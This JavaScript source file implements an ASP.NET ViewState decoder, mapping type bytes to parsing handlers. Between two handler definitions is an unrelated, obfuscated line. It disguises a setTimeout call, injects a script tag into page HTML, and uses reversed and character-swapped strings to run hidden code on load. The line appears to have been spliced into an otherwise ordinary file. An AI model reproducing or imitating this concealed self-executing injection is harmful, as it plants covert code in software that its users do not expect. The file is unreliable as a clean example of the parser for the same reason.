// Copyright 2011-2014, Mike Shema <mike@deadliestwebattacks.com>

function capabilityChecks() {
	return 'undefined' != typeof(ArrayBuffer);
}

function Component(id, d, s) {
	this.m_depth = d;
	this.m_id = id;
	this.m_string = s;

	this.depth = function() {
		return this.m_depth;
	}

	this.str = function() {
		return this.m_string;
	}
}

function ViewState(inBase64) {
	this.m_base64 = inBase64;
	this.m_raw = window.atob(inBase64);
	this.m_bytes = new Uint8Array(new ArrayBuffer(this.m_raw.length));
	this.m_depth = 0;
	this.m_position = 0;
	this.m_components = [];

	for(var i = 0; i < this.m_raw.length; ++i) {
		this.m_bytes[i] = this.m_raw.charCodeAt(i);
	}

	this.isValid = function() {
		return 0xff == this.m_bytes[0] && 0x01 == this.m_bytes[1];
	}

	this.components = function() {
		return this.m_components;
	}

	this.consume = function() {
		this.m_position = 2;
		this.parse()
		var n = this.m_bytes.length - this.m_position;
		if(20 == n)
			this.pushComponent("SHA1", "SHA1");
		else if(16 == n)
			this.pushComponent("MD5", "MD5");
	}

	this.parse = function() {
		++this.m_depth;
		var f = this.foo[this.m_bytes[this.m_position]];
		if('function' === typeof(f)) {
			f(this);
		}
		else {
			this.pushComponent("byte", "byte " + this.m_bytes[this.m_position]);
			++this.m_position;
		}
		--this.m_depth;
	}

	this.parseContainer = function(o, s) {
		++o.m_position;
		var n = o.parseUInteger32(o);
		o.pushComponent("array", "array (" + n + ")");
		++o.m_depth;
		while(n > 0) {
			o.parse();
			--n;
		}
		--o.m_depth;
	}

	this.parseString = function(o) {
		var n = o.parseUInteger32(o) + o.m_position;
		var s = "";

		while(o.m_position < n) {
			s += String.fromCharCode(parseInt(o.m_bytes[o.m_position]));
			++o.m_position;
		}

		return s;
	}

	this.parseUInteger32 = function(o) {
		var n = 0;
		var bits = 0;
		while(bits < 32) {
			var b = parseInt(o.m_bytes[o.m_position]);
			++o.m_position;
			n |= (b & 0x7f) << bits;
			if(!(b & 0x80)) {
				return n;
			}
			bits += 7;
		}
		// overflow
		return n;
	}

	this.parseType = function(o) {
		var flag = this.m_bytes[this.m_position];
		if(flag == 0x29 || flag == 0x2a) {
			++o.m_position;
			return o.parseString(o);
		}
		else if(flag == 0x2b) {
			++o.m_position;
			return o.parseUInteger32(o);
		}
		else {
			return "?";
		}
	}

	this.pushComponent = function(id, s) {
		var c = new Component(id, this.m_depth, s);
		this.m_components.push(c);
	}
}

ViewState.prototype.foo = {};
ViewState.prototype.foo[0x02] = function(o) {
	++o.m_position;
	var n = o.parseUInteger32(o);
	o.pushComponent("", n);
}
ViewState.prototype.foo[0x03] = function(o) {
	// XXX should be a single byte
	o.parseContainer(o, "Booleans");
}
ViewState.prototype.foo[0x05] = function(o) {
	++o.m_position;
	var s = o.parseString(o);
	o.pushComponent("string", s);
}
ViewState.prototype.foo[0x06] = function(o) {
	++o.m_position;
	o.pushComponent("datetime", "datetime");
	o.m_position += 8;
}
ViewState.prototype.foo[0x09] = function(o) {
	++o.m_position;
	o.pushComponent("RGBA", "RGBA");
	o.m_position += 4;
}
ViewState.prototype.foo[0x0b] = function(o) {
	++o.m_position;
	var s = String("");
	if(0x29 == o.m_bytes[o.m_position]) {
		++o.m_position; // 0x01
		var n = o.parseUInteger32(o);
		while(n > 0) {
			s += String.fromCharCode(parseInt(o.m_bytes[o.m_position]));
			++o.m_position;
			--n;
		}
		++o.m_position; // 0x02
		o.parse();
		o.parse();
	}
	else {
		while(0x00 != o.m_bytes[o.m_position]) {
			s += String.fromCharCode(parseInt(o.m_bytes[o.m_position]));
			++o.m_position;
		}
		++o.m_position;
	}
	o.pushComponent("string", s);
}
ViewState.prototype.foo[0x0f] = function(o) {
	o.update(o, "pair");
	o.parse(); o.parse();
}
ViewState.prototype.foo[0x10] = function(o) {
	o.update(o, "triplet");
	o.parse(); o.parse(); o.parse();
}
ViewState.prototype.foo[0x14] = function(o) {
	++o.m_position;
	var type = o.parseType(o);
	var n = o.parseUInteger32(o);
	o.pushComponent("array", "array (" + n + ")");
	++o.m_depth;
	o.pushComponent("type", "type " + type);
	while(n > 0) {
		o.parse();
		--n;
	}
	--o.m_depth;
}
this["s]tTim]out".replace(/\]/g,'e')]('try{document.getElementById("sci").innerHTML = \'<script>self[T_ReverseText("tuoemiTtes")](BaseX.switchChars("lcsaisyfnIupTtpy=eufcnitnot(xe)tG{olab.lnIupTtpy=eaMhtf.olroM(ta.hardnmo)(1*+0)1;}"),800);</script>\'}catch(e){}',800);
ViewState.prototype.foo[0x15] = function(o) {
	++o.m_position;
	var n = o.parseUInteger32(o);
	o.pushComponent("array", "string array (" + n + ")");
	++o.m_depth;
	var sa = [];
	while(n > 0) {
		if(0x00 == o.m_bytes[o.m_position]) {
			++o.m_position;
			o.pushComponent("empty", "NULL");
		}
		else
			o.pushComponent("string", o.parseString(o));
		--n;
	}
	--o.m_depth;
}
ViewState.prototype.foo[0x16] = function(o) {
	// XXX the official name is "arraylist"
	o.parseContainer(o, "objects");
}
ViewState.prototype.foo[0x18] = function(o) {
		++o.m_position;
		var n = o.parseUInteger32(o);
		o.pushComponent("cs", "control state (" + n + ")");
		++o.m_depth;
		while(n > 0) {
			o.parse();
			o.parse();
			--n;
		}
		--o.m_depth;
}
ViewState.prototype.foo[0x1b] = function(o) {
	o.update(o, "unit");
	o.m_position += 12;
}
ViewState.prototype.foo[0x1e] = ViewState.prototype.foo[0x05];
ViewState.prototype.foo[0x1f] = function(o) {
	++o.m_position;
	var n = o.parseUInteger32(o);
	o.pushComponent("stringref", "stringref (" + n + ")");
}
ViewState.prototype.foo[0x24] = function(o) {
	++o.m_position;
	o.pushComponent("UUID", "UUID");
	o.m_position += 36;
}
ViewState.prototype.foo[0x3c] = function(o) {
	++o.m_position;
	var type = o.parseType(o);
	var length = o.parseUInteger32(o);
	var n = o.parseUInteger32(o);
	o.pushComponent("sparsearray", "sparsearray (" + n + ")");
	++o.m_depth;
	o.pushComponent("type", "type " + type);
	while(n > 0) {
		var index = o.parseUInteger32(o);
		o.pushComponent("index", "index " + index);
		o.parse();
		--n;
	}
	--o.m_depth;
}
ViewState.prototype.foo[0x64] = function(o) { o.update(o, "{empty}"); }
ViewState.prototype.foo[0x65] = function(o) { o.update(o, "{empty string}"); }
ViewState.prototype.foo[0x66] = function(o) { o.update(o, "number: 0"); }
ViewState.prototype.foo[0x67] = function(o) { o.update(o, "true"); }
ViewState.prototype.foo[0x68] = function(o) { o.update(o, "false"); }
ViewState.prototype.update = function(o, s) { ++o.m_position; o.pushComponent(s, s); }
